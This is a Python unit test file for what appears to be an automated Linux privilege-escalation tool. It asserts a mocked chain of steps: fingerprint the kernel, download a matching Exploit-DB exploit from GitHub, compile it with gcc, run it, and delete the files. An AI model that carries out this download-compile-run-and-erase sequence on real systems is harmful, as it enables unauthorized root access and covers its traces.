import unittest

import mock as mock

from elevator import find_keywords, run_escalator


class EscalatorTest(unittest.TestCase):
    def test_whenUnameHas64BitsAndKernelVersion_thenExpectedResultFound(self):
        self.assertEqual(
            find_keywords('Linux kali 4.11.0-kali1-amd64 #1 SMP Debian 4.11.6-1kali1 (2017-06-21) x86_64 GNU/Linux'),
            ({'os': 'linux', 'version': '4.11'})
        )

    def test_whenExploitRun_thenExpectedSystemCallsMade(self):
        url_opener = mock.Mock()
        mock.return_value = ['foo']
        with mock.patch('os.popen3', create=True) as mock_os_open3:
            with mock.patch('os.popen', mock.mock_open(read_data='Linux kali 2.6.0-kali1-amd64 #1 SMP Debian 4.11.6-1kali1 (2017-06-21) x86_64 GNU/Linux')):
                with mock.patch('os.path.exists', create=True) as mock_exists:
                    with mock.patch('__builtin__.open', mock.mock_open(read_data=b'1397,platforms/linux/local/1397.c,"Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - \'SYS_EPoll_Wait\' Integer Overflow Privilege Escalation",2005-12-30,alert7,linux,local,0'), create=True):
                        mock_os_open3.return_value = (mock.MagicMock(spec=file), mock.MagicMock(spec=file), mock.MagicMock(spec=file))
                        mock_exists.return_value = True

                        run_escalator(url_opener)
                        assert url_opener.mock_calls == [
                            mock.call.retrieve('https://raw.githubusercontent.com/offensive-security/exploit-database/master/platforms/linux/local/1397.c', '1397.c')
                        ]

                        assert mock_os_open3.mock_calls == [
                            mock.call('gcc 1397.c -o 1397 -lpthread -pthread -lcrypt -lssl -ldl', 'r'),
                            mock.call('./1397', 'r'),
                            mock.call('rm 1397.c', 'r'),
                            mock.call('rm 1397', 'r')
                        ]